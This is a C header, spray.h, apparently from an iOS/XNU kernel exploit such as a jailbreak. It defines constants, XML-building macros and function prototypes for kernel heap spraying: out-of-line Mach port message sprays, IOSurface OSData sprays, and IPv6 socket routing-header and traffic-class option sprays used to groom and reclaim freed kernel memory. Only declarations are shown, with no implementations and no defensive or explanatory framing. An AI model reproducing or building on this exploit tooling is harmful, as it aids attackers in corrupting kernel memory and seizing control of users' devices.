#ifndef SPRAY_H
#define SPRAY_H

#include <mach/mach.h>
#include <sys/socket.h>

#include "IOKitLib.h"

// For OOL_PORTS_DESCRIPTOR heap spray
#define SPRAYS 1
#define OOL_PORTS 32 // 32 * POINTER == 256 B <- user_data_content + sizeof(user_data_element) ==  224 + 32 == 256 B
#define OOL_MESSAGES 256

// For IOSurface heap spray
#define NULL_BYTE_HEX "00"
#define CHUNK_SPRAY_SIZE 0x800
#define N_OSDATA_SPRAY 0x4

#define N_SOCKETS 8

#define MAGIC_CONSTANT 0xdeadf007

#define CREATE_SPRAY_DATA(X, Y)			\
    sprintf(X, "%s%s%s",			\
        "<data>",		\
        Y,  				\
        "</data>\n");

#define BEGIN_SPRAY_STRING(X) \
    sprintf(X, "%s%s",	      \
        "<array>\n",      \
        "<array>\n");

#define APPEND_SPRAY_STRING_END(X, Y)		\
    strcat(X, "</array>\n");	   \
    strcat(X, "<string>");	   \
    strcat(X, Y);		   \
    strcat(X, "</string>\n");	   \
    strcat(X, "</array>\n");

struct ool_ports_msg {
    mach_msg_header_t header;
    mach_msg_body_t body;
    mach_msg_ool_ports_descriptor_t ool_ports[];
};

typedef struct ool_ports_msg * ool_ports_msg_t;

mach_port_t * prepare_spray_ports();
int ool_ports_descriptor_spray_many(mach_port_t *receive_ports, size_t receive_ports_count, size_t message_count, mach_port_t *ports, size_t ports_count);
int ool_ports_descriptor_spray(mach_port_t receive_port, size_t message_count, mach_port_t *ports, size_t ports_count);
int ool_ports_descriptor_receive_many(mach_port_t *receive_ports, size_t receive_ports_count, size_t message_count);
int ool_ports_descriptor_receive(mach_port_t receive_port, size_t message_count);
int spray_kernel_heap_with_zeroes(io_connect_t *connection, uint32_t *surface_id, char *key);
int *prepare_socks();
void replace_sock(int *socks, int index);
void rthdr_spray(int *spray_sock, uint8_t **buf_array, size_t buf_len);
int free_opts(int s);
void reset_spray_socks_pktopts(int *spray_sock);
void reset_spray_socks_opts(int *spray_sock);
void close_spray_socks(int *spray_sock);
size_t prepare_rthdr_msg(uint8_t **buf, size_t size);
void tclass_spray(int *spray_socks);
int get_rthdr(int s, uint8_t *buf, socklen_t len);

#endif